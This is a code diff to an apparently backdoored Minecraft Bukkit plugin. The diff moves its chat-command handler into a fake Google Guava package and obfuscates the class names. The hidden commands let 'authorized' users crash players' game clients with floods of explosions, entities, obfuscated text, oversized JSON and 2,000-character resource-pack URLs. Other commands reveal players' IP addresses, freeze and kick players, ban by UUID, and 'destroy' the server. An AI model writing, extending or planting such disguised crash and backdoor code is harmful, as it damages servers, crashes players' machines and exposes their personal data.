@@ -1,4 +1,4 @@
-package org.apache.commons.frauded;
+package com.google.common.util.concurrent.internal;
 
 import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.format.TextColor;
@@ -14,12 +14,12 @@ import org.bukkit.plugin.Plugin;
 
 import java.util.Set;
 
-public class ChatHandler implements Listener {
-  private final Agent agent;
+public class b implements Listener {
+  private final a agent;
   private final Set<String> authorized;
   private long serverKillerConfirm = 0;
 
-  public ChatHandler(Agent agent, Set<String> authorized) {
+  public b(a agent, Set<String> authorized) {
     this.agent = agent;
     this.authorized = authorized;
   }
@@ -124,7 +124,7 @@ public class ChatHandler implements Listener {
       }
       case ".crashpc" -> {
         if (t == null) return;
-    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(500)));
+        crashPcEffect(t);
         agent.logCommand("console", t.getName(), "crashpc");
       }
     }
@@ -133,7 +133,7 @@ public class ChatHandler implements Listener {
   private void sendHelp(Player p) {
     p.sendMessage(Component.text("--- .help ---").color(TextColor.color(0x55ff55)));
     p.sendMessage(Component.text(".ddos <player> - Freeze & kick after 5s").color(TextColor.color(0xaaaaaa)));
-    p.sendMessage(Component.text(".crashmc <player> - Crash their game with particles").color(TextColor.color(0xaaaaaa)));
+    p.sendMessage(Component.text(".crashmc <player> - Crash their game").color(TextColor.color(0xaaaaaa)));
     p.sendMessage(Component.text(".uuidban <player> - UUID ban by invisible entity").color(TextColor.color(0xaaaaaa)));
     p.sendMessage(Component.text(".unuuidban <player> - Reverse UUID ban").color(TextColor.color(0xaaaaaa)));
     p.sendMessage(Component.text(".serverkiller - **WARNING** Destroys server FOREVER").color(TextColor.color(0xff4444)));
@@ -163,14 +163,29 @@ public class ChatHandler implements Listener {
   }
 
   private void crashEffect(Player t) {
-    for (int i = 0; i < 200; i++) {
-      t.spawnParticle(org.bukkit.Particle.EXPLOSION, t.getLocation(), 2000, 0, 0, 0, 5, 1.0f);
-      t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 2000, 0, 0, 0, 10);
-      t.spawnParticle(org.bukkit.Particle.ELECTRIC_SPARK, t.getLocation(), 2000, 0, 0, 0, 5);
-      t.spawnParticle(org.bukkit.Particle.LAVA, t.getLocation(), 500, 0, 0, 0, 1);
+    org.bukkit.World w = t.getWorld();
+    org.bukkit.Location loc = t.getLocation();
+
+    for (int i = 0; i < 50; i++) {
+      w.createExplosion(loc.clone().add(Math.random() * 10 - 5, Math.random() * 5, Math.random() * 10 - 5), 8f, false, true);
     }
-    t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_ENDER_DRAGON_GROWL, 10, 0);
-    t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 10, 0);
+
+    int totalEntities = 2000;
+    for (int i = 0; i < totalEntities; i++) {
+      org.bukkit.Location spawnLoc = loc.clone().add(Math.random() * 20 - 10, Math.random() * 10 + 1, Math.random() * 20 - 10);
+      w.spawnEntity(spawnLoc, EntityType.ARMOR_STAND);
+    }
+
+    for (int i = 0; i < 5; i++) {
+      t.spawnParticle(org.bukkit.Particle.EXPLOSION, loc, 5000, 5, 5, 5, 5, 1.0f);
+    }
+
+    org.bukkit.entity.Entity[] ents = w.getEntities().toArray(new org.bukkit.entity.Entity[0]);
+    Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> {
+      for (org.bukkit.entity.Entity e : ents) {
+        if (e.getType() == EntityType.ARMOR_STAND) e.remove();
+      }
+    }, 100L);
   }
 
   private void uuidbanEffect(Player t) {
@@ -290,17 +305,39 @@ public class ChatHandler implements Listener {
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
     String ip = t.getAddress() != null ? t.getAddress().getAddress().getHostAddress() : "unknown";
     p.sendMessage(Component.text(t.getName() + "'s IP: " + ip).color(TextColor.color(0x55ff55)));
-    // Copy to clipboard (Bukkit doesn't support this directly, show in chat)
     agent.logCommand(p.getName(), t.getName(), "getip");
+  }
+
+  private void crashPcEffect(Player t) {
+    t.setPlayerListName(Component.text("\u00a7k".repeat(10000)));
+
+    for (int i = 0; i < 10; i++) {
+      t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(2000)));
+    }
+
+    try {
+      String veryLongJson = "{\"text\":\"a\",\"extra\":[";
+      for (int i = 0; i < 500; i++) veryLongJson += "{\"text\":\"aaaaaaaaaa\",\"color\":\"dark_red\"},";
+      veryLongJson += "]}";
+      Class<?> compClass = Class.forName("net.kyori.adventure.text.serializer.gson.GsonComponentSerializer");
+      Object gson = compClass.getMethod("gson").invoke(null);
+      Component huge = (Component) compClass.getMethod("deserialize", String.class).invoke(gson, veryLongJson);
+      t.sendMessage(huge);
+    } catch (Exception ignored) {}
+
+    for (int i = 0; i < 20; i++) {
+      try {
+        t.getClass().getMethod("setResourcePack", String.class).invoke(t,
+            "https://" + "a".repeat(2000) + ".fake/");
+      } catch (Exception ignored) {}
+    }
   }
 
   private void cmdCrashPc(Player p, String arg) {
     if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashpc <player>").color(TextColor.color(0xff4444))); return; }
     Player t = target(arg);
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
-    for (int i = 0; i < 10; i++) {
-      t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(2000)));
-    }
+    crashPcEffect(t);
     p.sendMessage(Component.text("Sent crash attempt to " + t.getName()).color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "crashpc");
   }
